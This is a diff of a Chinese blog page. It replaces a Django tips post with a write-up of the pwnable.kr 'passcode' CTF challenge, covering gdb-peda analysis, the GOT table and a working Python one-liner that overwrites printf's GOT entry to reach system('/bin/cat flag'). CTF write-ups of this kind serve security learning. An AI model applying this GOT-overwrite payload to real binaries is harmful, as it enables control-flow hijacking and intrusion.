@@ -4,24 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>python django 简单总结 | Reshahar的博客</title>
+    <title>pwnable.kr passcode | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="python django 的一些小问题的解决办法">
-<meta name="keywords" content="python,django">
+    <meta name="description" content="pwnable.kr 上的第五道题">
+<meta name="keywords" content="pwn,pwnable.kr">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python django 简单总结">
-<meta property="og:url" content="http://Reshahar.github.io/2017/04/17/python-django-简单总结/index.html">
+<meta property="og:title" content="pwnable.kr passcode">
+<meta property="og:url" content="http://Reshahar.github.io/2017/05/27/pwnable-kr-passcode/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="python django 的一些小问题的解决办法">
-<meta property="og:updated_time" content="2017-04-17T08:55:57.724Z">
+<meta property="og:description" content="pwnable.kr 上的第五道题">
+<meta property="og:updated_time" content="2017-05-30T14:09:00.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python django 简单总结">
-<meta name="twitter:description" content="python django 的一些小问题的解决办法">
+<meta name="twitter:title" content="pwnable.kr passcode">
+<meta name="twitter:description" content="pwnable.kr 上的第五道题">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -82,14 +82,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/04/17/python-django-简单总结/" title="python django 简单总结" itemprop="url">python django 简单总结</a>
+      <a href="/2017/05/27/pwnable-kr-passcode/" title="pwnable.kr passcode" itemprop="url">pwnable.kr passcode</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-04-17T08:48:11.000Z" itemprop="datePublished"> 发表于 2017-04-17</time>
+    <time datetime="2017-05-27T15:11:46.000Z" itemprop="datePublished"> 发表于 2017-05-27</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -103,41 +103,179 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-总结"><span class="toc-number">2.</span> <span class="toc-text">0x01 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-参考"><span class="toc-number">3.</span> <span class="toc-text">0x02 参考</span></a></li></ol>
 		
 		</div>
 		
-		<p>python django 的一些小问题的解决办法</p>
-<a id="more"></a>
+		<p>pwnable.kr 上的第五道题</p>
 <hr>
-<p>1.创建网站</p>
-<pre><code>django-admin startproject 项目名
-</code></pre><p>2.创建一个app(创建完网站先进入网站的目录)</p>
-<pre><code>django-admin startapp app名
-</code></pre><p>3.运行网站</p>
-<pre><code>python manage.py runserver 地址:端口
-</code></pre><p>4.导入已经存在的数据库</p>
-<pre><code>python manage.py inspectdb &gt;App路径/models.py
-</code></pre><p>5.将models中的类生成migrations（适用于自己写model在导入数据库）</p>
-<pre><code>python manage.py makemigrations
-将上面生成的结果导入数据库
-python manage.py migrate
-</code></pre><p>6.自定义自增主键</p>
-<pre><code>在自己要定义的自增主键中添加（primary_key=True）
-</code></pre>  
+<a id="more"></a>
+<h3 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00 分析"></a>0x00 分析</h3><p>首先 ssh passcode@pwnable.kr -p2222 连上去，也可以用Xshell，查看目录文件和代码内容</p>
+<pre><code>passcode@ubuntu:~$ ls
+flag  passcode    passcode.c
+passcode@ubuntu:~$ cat passcode.c 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void login(){
+    int passcode1;
+    int passcode2;
+
+    printf(&quot;enter passcode1 : &quot;);
+    scanf(&quot;%d&quot;, passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf(&quot;enter passcode2 : &quot;);
+        scanf(&quot;%d&quot;, passcode2);
+
+    printf(&quot;checking...\n&quot;);
+    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+                printf(&quot;Login OK!\n&quot;);
+                system(&quot;/bin/cat flag&quot;);
+        }
+        else{
+                printf(&quot;Login Failed!\n&quot;);
+        exit(0);
+        }
+}
+
+void welcome(){
+    char name[100];
+    printf(&quot;enter you name : &quot;);
+    scanf(&quot;%100s&quot;, name);
+    printf(&quot;Welcome %s!\n&quot;, name);
+}
+
+int main(){
+    printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;);
+
+    welcome();
+    login();
+
+    // something after login...
+    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
+    return 0;    
+}
+</code></pre><p>由上面的代码可以看出scanf少了&amp;,这里输入数字会产生崩溃（在没有取地址的时候，程序会在栈上去数据作为地址），看是我认为是将后面的int认为是char[]这样就可以不用取地址了，但是调试后发现并不正确，最后将目光转到welcome函数，我尝试着输入十次0-9的数字，看看他有没有溢出的或者其他的因为login函数里scanf的参数是在栈上的会不会可以覆盖，但是由于对gdb-peda插件的栈中内容没有看懂，误以为栈上的数据就是栈上值，实际栈上的地址，导致判断错了，覆盖的位置，但是判断出的是76，但实际这是栈地址，后来就没有思路了，最后还是上网上找了wp，读了才发现是哪里的问题</p>
+<p>调整思路重新调试，如下，首先在login函数下断点</p>
+<pre><code>gdb-peda$ pattern create 150 1.txt
+Writing pattern of 150 chars to filename &quot;1.txt&quot;
+gdb-peda$ b login 
+Breakpoint 1 at 0x8048531
+gdb-peda$ r &lt;1.txt 
+.....
+0x8048547 &lt;login+28&gt;:    push   0x8048713
+=&gt; 0x804854c &lt;login+33&gt;:    call   0x8048420 &lt;__isoc99_scanf@plt&gt;
+0x8048551 &lt;login+38&gt;:    add    esp,0x10
+0x8048554 &lt;login+41&gt;:    mov    eax,ds:0x8049a44
+0x8048559 &lt;login+46&gt;:    sub    esp,0xc
+0x804855c &lt;login+49&gt;:    push   eax
+Guessed arguments:
+arg[0]: 0x8048713 --&gt; 0x65006425 (&apos;%d&apos;)
+arg[1]: 0x4c414136 (&apos;6AAL&apos;)
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd3e0 --&gt; 0x8048713 --&gt; 0x65006425 (&apos;%d&apos;)
+0004| 0xffffd3e4 (&quot;6AALAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0008| 0xffffd3e8 (&quot;AA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0012| 0xffffd3ec (&quot;AJAAfAA5AAKAAgAA6AAL&quot;)
+0016| 0xffffd3f0 (&quot;fAA5AAKAAgAA6AAL&quot;)
+0020| 0xffffd3f4 (&quot;AAKAAgAA6AAL&quot;)
+0024| 0xffffd3f8 (&quot;AgAA6AAL&quot;)
+0028| 0xffffd3fc (&quot;6AAL&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804854c in login ()
+gdb-peda$ pattern offset 0x4c414136
+1279344950 found at offset: 96
+gdb-peda$
+</code></pre><p>通过peda插件的Guessed arguments:可以看到scanf的参数，这是之前没有注意到的，通过pattern确定偏移的，位置可以看到在name变量的96位就是scanf的第二个参数要写入的地址，所以可以将将输入的字符写到可以写入的地址，这里我试着将两个scanf的输入地址都改写，但是本地还是没有成功，wp中写在welcome中做了校验，但是我的没有，后来才发现，是编译选项写的不对，没有开启Stack Canary，开启Stack Canary后，name的长度就不能溢出了，否则程序会跳转到___stack_chk_fail函数执行</p>
+<pre><code>//Stack Canary 
+mov     eax, [ebp+var_C]
+xor     eax, large gs:14h
+jz      short locret_80486A2
+</code></pre><p>然后根据wp的思路是去改写got表，因为got是可写的，而且可以换劫持控制流</p>
+<p>首先，在本地看一下got表，使用readelf -r</p>
+<pre><code>root@kali:~/D/tmp/pwnable.kr-passcode# readelf -r ./passcode
+
+Relocation section &apos;.rel.dyn&apos; at offset 0x32c contains 2 entries:
+Offset     Info    Type            Sym.Value  Sym. Name
+08049a0c  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
+08049a44  00000a05 R_386_COPY        08049a44   stdin
+
+Relocation section &apos;.rel.plt&apos; at offset 0x33c contains 8 entries:
+Offset     Info    Type            Sym.Value  Sym. Name
+08049a1c  00000107 R_386_JUMP_SLOT   00000000   printf
+08049a20  00000207 R_386_JUMP_SLOT   00000000   fflush
+08049a24  00000307 R_386_JUMP_SLOT   00000000   puts
+08049a28  00000407 R_386_JUMP_SLOT   00000000   system
+08049a2c  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__
+08049a30  00000607 R_386_JUMP_SLOT   00000000   exit
+08049a34  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
+08049a38  00000807 R_386_JUMP_SLOT   00000000   __isoc99_scanf
+</code></pre><p>源程序中，在scanf后调用了fflush，printf，exit 三个函数，任选其中一个函数修改成程序中调用system的地址，就能拿到flag</p>
+<pre><code>//调用system的地址
+.text:080485BA                 sub     esp, 0Ch
+.text:080485BD                 push    offset command  ; &quot;/bin/cat flag&quot;
+.text:080485C2                 call    _system
+.text:080485C7                 add     esp, 10h
+</code></pre><p>所以，综上上面说的将0x08049a1c(printf)得地址改成0x080485BD就行了，这里输入的是十进制0x080485BD==134514109</p>
+<p>本地测试如下，本地创建flag文件，内容1234567，可以看到查到flag了</p>
+<pre><code>root@kali:~/D/tmp/pwnable.kr-passcode# python -c &quot;print &apos;A&apos;*96+&apos;\x1c\x9a\x04\x08&apos;+&apos;\n&apos;+&apos;134514109&apos;+&apos;\n&apos;&quot;| ./passcode
+Toddler&apos;s Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
+1234567
+enter passcode1 : Now I can safely trust you that you have credential :)
+</code></pre><p>远程我们要重新查看一下got表，以及调用system的地址，这个和不同环境有关，具体如下：</p>
+<pre><code>//查看got
+passcode@ubuntu:~$ readelf -r passcode
+
+Relocation section &apos;.rel.dyn&apos; at offset 0x388 contains 2 entries:
+Offset     Info    Type            Sym.Value  Sym. Name
+08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
+0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0
+
+Relocation section &apos;.rel.plt&apos; at offset 0x398 contains 9 entries:
+Offset     Info    Type            Sym.Value  Sym. Name
+0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
+0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
+0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
+0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
+0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
+0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
+0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
+0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
+0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
+
+//gdb 查看调用system地址
+0x080485e3 &lt;+127&gt;:    movl   $0x80487af,(%esp)
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;
+0x080485ef &lt;+139&gt;:    leave  
+</code></pre><p>经过计算最后payload如下：</p>
+<pre><code>python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514147&apos;+&apos;\n&apos;&quot;| ./passcode
+</code></pre><p>实际运行结果，拿下flag</p>
+<pre><code>passcode@ubuntu:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514147&apos;+&apos;\n&apos;&quot;| ./passcode
+Toddler&apos;s Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Sorry mom.. I got confused about scanf usage :(
+enter passcode1 : Now I can safely trust you that you have credential :)
+</code></pre><h3 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h3><p>通过这个题，知道了got表是什么样的，怎么重写，怎么利用这样的漏洞</p>
+<h3 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h3><p>[1]<a href="http://blog.csdn.net/qq_20307987/article/details/51303824" target="_blank" rel="external">http://blog.csdn.net/qq_20307987/article/details/51303824</a>  pwnable.kr之passcode</p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/web/">web</a>
+  <a class="article-category-link" href="/categories/ctf-pwn/">ctf-pwn</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/python/">python</a><a href="/tags/django/">django</a>
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/pwnable-kr/">pwnable.kr</a>
   </div>
 
 </div>
@@ -146,7 +284,7 @@ python manage.py migrate
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/04/17/python-django-简单总结/" data-title="python django 简单总结 | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2017/05/27/pwnable-kr-passcode/" data-title="pwnable.kr passcode | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -160,21 +298,13 @@ python manage.py migrate
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/04/13/Linux x86 栈溢出/" title="linux x86 栈溢出">
+ <a href="/2017/05/26/pwnable-kr-flag/" title="pwnable.kr之flag">
   <strong>上一篇：</strong><br/>
   <span>
-  linux x86 栈溢出</span>
+  pwnable.kr之flag</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/05/04/360春秋杯smallest-pwn的学习与利用/"  title="360春秋杯smallest-pwn的学习与利用">
- <strong>下一篇：</strong><br/> 
- <span>360春秋杯smallest-pwn的学习与利用
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -186,7 +316,7 @@ python manage.py migrate
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-分析"><span class="toc-number">1.</span> <span class="toc-text">0x00 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-总结"><span class="toc-number">2.</span> <span class="toc-text">0x01 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-参考"><span class="toc-number">3.</span> <span class="toc-text">0x02 参考</span></a></li></ol>
  
   </div>
 
